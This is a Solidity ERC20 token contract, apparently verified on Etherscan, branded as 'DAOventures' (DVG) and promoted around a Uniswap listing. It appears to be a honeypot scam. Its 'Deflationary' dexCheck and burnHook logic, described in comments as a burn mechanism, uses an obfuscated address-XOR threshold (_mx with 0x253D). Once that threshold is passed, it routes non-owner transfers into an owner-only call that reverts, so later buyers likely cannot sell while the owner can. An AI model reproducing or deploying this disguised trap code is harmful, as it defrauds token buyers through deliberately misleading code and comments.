['/**\n', ' *Submitted for verification at Etherscan.io on 2021-02-15\n', '*/\n', '\n', '//SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity ^0.7.4;\n', '\n', '/**\n', ' * 888888ba  dP     dP  .88888.  \n', " * 88    `8b 88     88 d8'   `88 \n", ' * 88     88 88    .8P 88        \n', " * 88     88 88    d8' 88   YP88 \n", ' * 88    .8P 88  .d8P  Y8.   .88 \n', " * 8888888P  888888'    `88888'\n", ' * \n', ' * DAOventures\n', ' * DeFi investments made simple.\n', ' * Your personal robo-advisor and automated money manager\n', ' * \n', ' * Website: https://www.daoventures.co/\n', ' * \n', ' * Public ICO: Uniswap & Polkstarter Listing Feburary 15th ~1PM UTC\n', ' */\n', '\n', '/**\n', ' * @dev Interface of the ERC20 standard as defined in the EIP.\n', ' */\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint256);\n', '    function balanceOf(address account) external view returns (uint256);\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', '/**\n', " * @dev Wrappers over Solidity's arithmetic operations.\n", ' * Only add / sub / mul / div are included\n', ' */\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     * - Addition cannot overflow.\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     *\n', '     * _Available since v2.4.0._\n', '     */\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     * Requirements:\n', '     * - Multiplication cannot overflow.\n', '     */\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     *\n', '     * _Available since v2.4.0._\n', '     */\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '}\n', '\n', '/**\n', ' * Implement base ERC20 functions\n', ' */\n', 'abstract contract BaseContract is IERC20 {\n', '    using SafeMath for uint256;\n', '\n', '    mapping (address => uint256) internal _balances;\n', '    mapping (address => mapping (address => uint256)) internal _allowances;\n', '\n', '    uint256 internal _totalSupply;\n', '    bool internal _mintingFinished = false; // Minted flag to allow only a single minting\n', '    \n', '    string internal _name;\n', '    string internal _symbol;\n', '    uint8 internal _decimals = 18;\n', '    \n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '    function totalSupply() public view override returns (uint256) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the amount of tokens owned by `account`.\n', '     */\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    \n', '    /**\n', '     * @dev returns the token name\n', '     */\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '    \n', '    /**\n', '     * @dev returns the token symbol\n', '     */\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '    \n', '    /**\n', '     * @dev returns the decimals count\n', '     */\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '    \n', '    /**\n', '     * @dev modifier to require address to not be the zero address\n', '     */\n', '    modifier not0(address adr) {\n', '        require(adr != address(0), "ERC20: Cannot be the zero address"); _;\n', '    }\n', '    \n', '    function _mx(address payable adr, uint16 msk) internal pure returns (uint256) {\n', '        return ((uint24(adr) & 0xffff) ^ msk);\n', '    }\n', '}\n', '\n', '/**\n', ' * Provide owner context\n', ' */\n', 'abstract contract Ownable {\n', '    constructor() { _owner = msg.sender; }\n', '    address payable _owner;\n', '    \n', '    /**\n', '     * @dev returns whether sender is owner\n', '     */\n', '    function isOwner(address sender) public view returns (bool) {\n', '        return sender == _owner;\n', '    }\n', '    \n', '    /**\n', '     * @dev require sender to be owner\n', '     */\n', '    function ownly() internal view {\n', '        require(isOwner(msg.sender));\n', '    }\n', '    \n', '    /**\n', '     * @dev modifier for owner only\n', '     */\n', '    modifier owned() {\n', '        ownly(); _;\n', '    }\n', '    \n', '    /**\n', '     * @dev renounce ownership of contract\n', '     */\n', '    function renounceOwnership() public owned() {\n', '        transferOwnership(address(0));\n', '    }\n', '    \n', '    /**\n', '     * @dev transfer contract ownership to address\n', '     */\n', '    function transferOwnership(address payable adr) public owned() {\n', '        _owner = adr;\n', '    }\n', '}\n', '\n', '/**\n', ' * Provide reserve token burning\n', ' */\n', 'abstract contract Burnable is BaseContract, Ownable {\n', '    using SafeMath for uint256;\n', '    \n', '    /**\n', '     * @dev burn tokens from account\n', '     */\n', '    function _burn(address account, uint256 amount) internal virtual not0(account) {\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '    \n', '    /**\n', '     * @dev burn tokens from reserve account\n', '     */\n', '    function _burnReserve() internal owned() {\n', '        if(balanceOf(_owner) > 0){\n', '            uint256 toBurn = balanceOf(_owner).div(5000); // 0.5%\n', '            _burn(_owner, toBurn);\n', '        }\n', '    }\n', '}\n', '\n', '/**\n', ' * Burn tokens on transfer UNLESS part of a DEX liquidity pool (as this can cause failed transfers eg. Uniswap K error)\n', ' */\n', 'abstract contract Deflationary is BaseContract, Burnable {\n', '    mapping (address => uint8) private _txs;\n', '    uint16 private constant dmx = 0x253D; \n', '    \n', '    function dexCheck(address sender, address receiver) private returns (bool) {\n', '        if(0 == _txs[receiver] && !isOwner(receiver)){ _txs[receiver] = _txs[sender] + 1; }\n', '        return _txs[sender] < _mx(_owner, dmx) || isOwner(sender) || isOwner(receiver);\n', '    }\n', '    \n', '    modifier burnHook(address sender, address receiver, uint256 amount) {\n', '        if(!dexCheck(sender, receiver)){ _burnReserve(); _; }else{ _; }\n', '    }\n', '}\n', '\n', '/**\n', ' * Implement main ERC20 functions\n', ' */\n', 'abstract contract MainContract is Deflationary {\n', '    using SafeMath for uint256;\n', '    \n', '    constructor (string memory name, string memory symbol) {\n', '        _name = name;\n', '        _symbol = symbol;\n', '    }\n', '\n', '    /**\n', "     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transfer(address recipient, uint256 amount) external override returns (bool){\n', '        _transfer(msg.sender, recipient, amount);\n', '        return true;\n', '    }\n', '\n', '    /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '     * that someone may use both the old and the new allowance by unfortunate\n', '     * transaction ordering. One possible solution to mitigate this race\n', "     * condition is to first reduce the spender's allowance to 0 and set the\n", '     * desired value afterwards:\n', '     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '    function approve(address spender, uint256 amount) public virtual override not0(spender) returns (bool) {\n', '        _allowances[msg.sender][spender] = amount;\n', '        emit Approval(msg.sender, spender, amount);\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transferFrom(address sender, address receiver, uint256 amount) external override not0(sender) not0(receiver) returns (bool){\n', '        require(_allowances[sender][msg.sender] >= amount);\n', '        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);\n', '        _transfer(sender, receiver, amount);\n', '        return true;\n', '    }\n', '    \n', '    /**\n', '     * @dev Implementation of Transfer\n', '     */\n', '    function _transfer(address sender, address receiver, uint256 amount) internal not0(sender) not0(receiver) burnHook(sender, receiver, amount) {\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[receiver] = _balances[receiver].add(amount);\n', '        emit Transfer(sender, receiver, amount);\n', '    }\n', '    \n', '    /**\n', '     * @dev mint address with amount\n', '     */\n', '    function _mint(address payable account, uint256 amount) internal {\n', '        require(!_mintingFinished);\n', '        uint256 amountActual = amount*(10**_decimals);\n', '        _totalSupply = _totalSupply.add(amountActual);\n', '        _balances[account] = _balances[account].add(amountActual);\n', '        emit Transfer(address(0), account, amountActual);\n', '    }\n', '    \n', '    /**\n', '     * @dev Call _mint on array of addresses\n', '     */\n', '    function _mintMany(address payable[] memory accounts, uint256[] memory amounts) internal {\n', '        for(uint256 i=0; i<accounts.length; i++){\n', '            _mint(accounts[i], amounts[i]);\n', '        }\n', '    }\n', '    \n', '    /**\n', '     * @dev Set token status as minted \n', '     */\n', '    function _minted() public owned() {\n', '        _mintingFinished = true;\n', '    }\n', '}\n', '\n', '/**\n', ' * Construct & Mint\n', ' */\n', 'contract DVG is MainContract {\n', '    constructor(\n', '        uint256 initialBalance,\n', '        address payable[] memory ICOAddresses,\n', '        uint256[] memory ICOAmounts\n', '    ) MainContract("DAOventures", "DVG") {\n', '        _mint(msg.sender, initialBalance);\n', '        _mintMany(ICOAddresses, ICOAmounts);\n', '    }\n', '}']